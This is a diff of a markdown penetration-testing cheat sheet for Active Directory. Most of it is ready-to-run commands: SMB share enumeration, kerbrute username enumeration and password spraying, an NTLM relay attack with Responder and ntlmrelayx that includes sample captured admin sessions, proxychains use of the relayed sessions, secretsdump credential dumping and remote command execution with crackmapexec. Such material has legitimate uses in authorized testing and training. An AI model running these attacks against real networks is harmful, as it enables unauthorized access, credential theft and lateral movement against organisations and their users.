@@ -43,6 +43,7 @@ Options to bypass firewall `-f / -sS / -PN`
 smbclient -U '%' -L //<dc-ip> && smbclient -U 'guest%' -L //<dc-ip>
 python3 smbmap.py --host-file smb-hosts.txt -d test.local -L
 ```
+- SMB: `smbclient -L 172.16.1.0`. To gain access a share: `smbclient  \\\\172.16.1.0\\$share`
 - Once you craft a list of possible usernames, you can perform nmap kerberoas bruteforce to get valid ones:  
 ```bash
 kerbrute userenum -d test.local usernames.txt
@@ -60,33 +61,35 @@ nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domai
   ```bash
   kerbrute passwordspray -d test.local domain_users.txt password123
   ```
-PS: Crackmapexec is prefered
+TIP: Crackmapexec is prefered
 
-- [Perform SMB Relay] :
+## NTLM Relay attack 
 
-### NTLM Relay attack #####
-
- modify on responder file /etc/responder/Responder.conf
+1 - First, makesure you modify on responder file `/etc/responder/Responder.conf` as below:
+```bash
 SMB = Off  // Off instead of On
 HTTP = Off  // Off instead of On
-
- Create a list of hosts within the environment with SMB signing disabled using crackmapexec
+```
+2 - Create a list of hosts within the environment with SMB signing disabled using crackmapexec
 
 ```bash
-crackmapexec smb 172.19.0.0/16 --gen-relay-list targets.txt
-wc -l targets.txt
+crackmapexec smb IP/RANGE --gen-relay-list targets.txt
+wc -l targets.txt #check how many targets you've gathered. 
 ```
- Fire up responeder to capture hashes
+Fire up responeder to capture hashes
 
  ```bash
-responder -I eth1 -r -d -w
+responder -I eth1 -d -w
 ```
- then fire up ntlmrelayx script to relay those hashes
+
+3 - fire up `ntlmrelayx` script to relay the obtained hashes
 
  ```bash
 impacket-ntlmrelayx -tf targets.txt -smb2support -debug -socks
 ```
- After a while u can check ntlmrelayx if any session was captured
+
+4 - Check ntlmrelayx if any session was captured.
+```bash
 ntlmrelayx> socks
 Protocol  Target         Username         AdminStatus  Port 
 --------  -------- 	 --------         --------     ------
@@ -95,15 +98,16 @@ SMB       192.168.1.16   DOM/alice_admin  TRUE         445
 SMB       192.168.1.17   DOM/alice_admin  TRUE         445
 SMB       192.168.1.13   DOM/alice_admin  TRUE         445
 SMB       192.168.1.31   DOM/alice_admin  TRUE         445
+```
+5 - Use proxychains to interact with ntlmrelayx socks fonctionality (1080 is the default port within ntlmrelayx)
 
-
- use proxychains to interact with ntlmrelayx socks fonctionality (1080 is the default port within ntlmrelayx)
+```bash
 nano /etc/proxychains.conf
 [ProxyList]
 socks4  127.0.0.1 1080
+```
 
-
- Now you can basically do what ever with those sessions
+6 - You can basically do whatever you want to do with those sessions
 
   ```bash
 proxychains impacket-smbclient -no-pass DOM/alice_admin@192.168.1.41
@@ -112,24 +116,20 @@ impacket-secretsdump DOM/bob_admin@192.168.1.8
 crackmapexec smb 192.168.1.10 -u dom_admin -p dom_admin_password -x whoami
 ```
 
+## With credentials 
 
-With credentials 
-
-Use the credentials in you favor enumerate usefull information you might you use in further attacks.
+Use the credentials in you favor to enumerate usefull information or gain access to computers maybe get a Domain Admin.
 
 - Get other users. `python3 GetADUsers.py -all test.local/john:password123 -dc-ip 10.10.10.1`
 - Get almost all information about an AD envirement:
+
  ```bash
  crackmapexec smb 10.10.10.1 -u 'john' -p 'password123' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
  ```
 
- ##### SMB SHARES #####
+## SMB SHARES
 
 ```bash
-without credentials : smbclient -L 172.16.1.0 
-
-without credentials access : smbclient  \\\\172.16.1.0\\$share
-
 with credentials : smbclient -L 172.16.1.0  -U=user%password
 
 with credentials access : smbclient \\\\172.16.1.0\\$share  -U=user%password
@@ -139,16 +139,4 @@ with ntlm access : smbclient \\\\172.16.1.0\\$share -U user --pw-nt-hash BD1C650
 mount smb share : sudo mkdir /tmp/data; sudo mount -t cifs -o 'user=USER,password=PASSWORD' //10.0.2.80/shareapp /tmp/data
 ```
 
-
 - Find computers you can login to. 
-
-Enumerate following:
-
-− Users
-− Computers
-− Domain Administrators
-− Enterprise Administrators
-− Shares
-
-
-
